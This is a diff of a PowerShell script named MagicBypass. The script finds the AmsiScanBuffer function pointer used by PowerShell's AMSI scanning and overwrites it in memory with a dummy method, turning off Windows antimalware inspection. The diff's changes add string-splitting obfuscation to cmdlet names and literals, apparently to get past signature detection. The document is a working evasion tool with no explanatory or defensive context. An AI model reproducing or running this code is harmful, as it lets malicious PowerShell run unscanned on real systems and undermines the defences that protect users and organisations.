@@ -1,7 +1,7 @@
-```
+&('')
 function MagicBypass {
 
-# Define named parameters
+
 param(
     $InitialStart = 0x50000,
     $NegativeOffset= 0x50000,
@@ -38,11 +38,11 @@ public class APIs {
 }
 "@
 
-Add-Type $APIs
+&("{2}{0}{1}" -f'T','ype','Add-') $APIs
 
-$InitialDate=Get-Date;
+$InitialDate=&("{0}{1}"-f 'Ge','t-Date');
 
-$string = 'hello, world'
+$string = ("{1}{0}{2}"-f 'llo, ','he','world')
 $string = $string.replace('he','a')
 $string = $string.replace('ll','m')
 $string = $string.replace('o,','s')
@@ -50,7 +50,7 @@ $string = $string.replace(' ','i')
 $string = $string.replace('wo','.d')
 $string = $string.replace('rld','ll')
 
-$string2 = 'hello, world'
+$string2 = ("{2}{1}{0}"-f 'orld','w','hello, ')
 $string2 = $string2.replace('he','A')
 $string2 = $string2.replace('ll','m')
 $string2 = $string2.replace('o,','s')
@@ -58,17 +58,17 @@ $string2 = $string2.replace(' ','i')
 $string2 = $string2.replace('wo','Sc')
 $string2 = $string2.replace('rld','an')
 
-$string3 = 'hello, world'
-$string3 = $string3.replace('hello','Bu')
+$string3 = ("{1}{0}{2}{3}"-f'wo','hello, ','rl','d')
+$string3 = $string3.replace(("{1}{0}"-f 'ello','h'),'Bu')
 $string3 = $string3.replace(', ','ff')
-$string3 = $string3.replace('world','er')
+$string3 = $string3.replace(("{0}{1}" -f'wor','ld'),'er')
 
 $Address = [APIS]::GetModuleHandle($string)
 [IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
 
 $Assemblies = [appdomain]::currentdomain.getassemblies()
 $Assemblies |
-  ForEach-Object {
+  .("{1}{2}{4}{3}{0}"-f'ct','For','Ea','je','ch-Ob') {
     if($_.Location -ne $null){
      $split1 = $_.FullName.Split(",")[0]
      If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
@@ -78,16 +78,16 @@ $Assemblies |
 }
 
 $Types |
-  ForEach-Object {
+  &("{0}{3}{2}{1}{4}" -f'For','bjec','O','Each-','t') {
     if($_.Name -ne $null){
      If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
-       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
+       $Methods = $_.GetMethods([System.Reflection.BindingFlags]("{2}{3}{0}{1}" -f'c,NonPub','lic','Stat','i'))
      }
     }
 }
 
 $Methods |
-  ForEach-Object {
+  &("{2}{0}{1}" -f'Obj','ect','ForEach-') {
     if($_.Name -ne $null){
      If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
        $MethodFound = $_
@@ -108,18 +108,18 @@ $ApiReturn = $false
      $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
      [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
      if ($PointerToCompare -eq $funcAddr) {
-       Write-Host "Found @ $($i)!"
+       .("{1}{0}{2}"-f 'ite-Hos','Wr','t') "Found @ $($i)! "
        [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
        break initialloop
      }
     }
 }
-[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
+[IntPtr] $DummyPointer = [APIs].GetMethod(("{1}{0}"-f'y','Dumm')).MethodHandle.GetFunctionPointer()
 $buf = [IntPtr[]] ($DummyPointer)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
 
-$FinishDate=Get-Date;
+$FinishDate=&("{0}{1}" -f 'G','et-Date');
 $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
-Write-Host "$TimeElapsed seconds"
+&("{0}{1}{2}{3}"-f'W','r','ite-H','ost') ("$TimeElapsed "+'second'+'s')
 }
-```
+.()
